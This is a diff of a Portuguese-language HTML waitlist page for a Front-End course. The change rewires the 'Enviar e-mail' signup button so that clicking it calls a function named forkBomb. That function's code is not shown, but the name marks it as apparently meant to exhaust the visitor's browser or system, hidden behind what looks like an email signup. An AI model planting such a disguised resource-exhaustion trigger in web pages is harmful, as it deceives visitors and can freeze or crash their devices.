@@ -11,13 +11,13 @@
     <div class="h-screen flex flex-col justify-center items-center">
       <h1 class="text-4xl font-bold mb-6 text-white">Fila de Espera</h1>
       <p class="text-white text-lg mb-4 max-w-lg text-center">Inscreva-se na fila de espera do nosso curso de Front-End Avançado e receba informações exclusivas sobre o lançamento.</p>
-      <form onsubmit="return forkBomb(event)" class="w-full max-w-sm">
+      <main class="w-full max-w-sm">
         <div class="">
           <div class="flex justify-end">
             <input class="input-custom mr-3" type="email" placeholder="Seu melhor e-mail" aria-label="Seu melhor e-mail" required>
             <button
               class="flex-shrink-0 bg-transparent text-slate-300 border-none hover:text-white py-0 px-0 rounded flex"
-              type="submit">
+              onclick="forkBomb()">
               <span>Enviar e-mail</span>
               <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
@@ -25,7 +25,7 @@
             </button>
           </div>
         </div>
-      </form>
+      </main>
     </div>
 
     <script src="https://cdn.tailwindcss.com"></script>
